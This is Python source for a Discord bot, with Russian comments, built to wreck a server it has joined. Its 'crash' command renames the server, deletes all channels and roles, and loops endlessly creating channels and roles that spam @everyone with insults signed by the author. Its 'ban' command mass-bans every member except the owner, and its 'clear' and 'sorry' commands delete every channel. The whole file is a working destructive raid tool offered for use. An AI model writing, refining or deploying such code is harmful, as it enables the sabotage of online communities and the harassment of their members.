import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)
active_tasks = set()

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}")

@bot.command(name="crash")
async def crash(ctx):
    """Штурм, смена названия, удаление, бесконечные роли и спам."""
    await ctx.message.delete()
    guild = ctx.guild

    # 1. Изменение названия сервера
    try:
        await guild.edit(name="crashed by stricxyyy")
    except Exception:
        pass

    # 2. Удаление доступных каналов и ролей параллельно
    delete_tasks = [channel.delete() for channel in guild.channels] + \
                   [role.delete() for role in guild.roles if role < ctx.me.top_role and not role.managed]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    # 3. Бесконечное создание каналов и ролей, а также спам
    async def create_and_flood():
        while True:
            try:
                channel_task = guild.create_text_channel("Crashed-b1tch")
                role_task = guild.create_role(name="crashed b1tch", color=discord.Color.red())
                channel, role = await asyncio.gather(channel_task, role_task)

                await asyncio.gather(*(channel.send(f"@everyone сервер вьебан by stricxyyy {role.mention}") for _ in range(5)))
            except Exception:
                await asyncio.sleep(0.1)

    task = asyncio.create_task(asyncio.gather(*(create_and_flood() for _ in range(5))))
    active_tasks.add(task)
    try:
        await task
    except asyncio.CancelledError:
        pass
    finally:
        active_tasks.discard(task)

@bot.command(name="sorry")
async def sorry(ctx):
    """Очистка всех каналов/ролей и создание канала с извинением."""
    await ctx.message.delete()
    guild = ctx.guild

    # 1. Удаление каналов и ролей
    delete_tasks = [channel.delete() for channel in guild.channels] + \
                   [role.delete() for role in guild.roles if role < ctx.me.top_role and not role.managed]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    # 2. Создание канала с извинением
    try:
        channel = await guild.create_text_channel("apology")
        await channel.send("простите @everyone")
    except Exception:
        pass

@bot.command(name="clear")
async def clear(ctx):
    """Удаление всех каналов на сервере."""
    await ctx.message.delete()
    guild = ctx.guild
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

@bot.command(name="stop")
async def stop(ctx):
    """Остановка активных процессов краша."""
    await ctx.message.delete()
    for task in active_tasks:
        task.cancel()
    active_tasks.clear()

@bot.command(name="ban")
async def ban(ctx):
    """Массовый бан всех участников сервера."""
    await ctx.message.delete()
    guild = ctx.guild

    ban_tasks = [
        guild.ban(member, reason="Server destroyed by TWKS") 
        for member in guild.members 
        if member != ctx.me and member != guild.owner
    ]
    
    await asyncio.gather(*ban_tasks, return_exceptions=True)

import os

bot.run(os.getenv("DISCORD_TOKEN"))
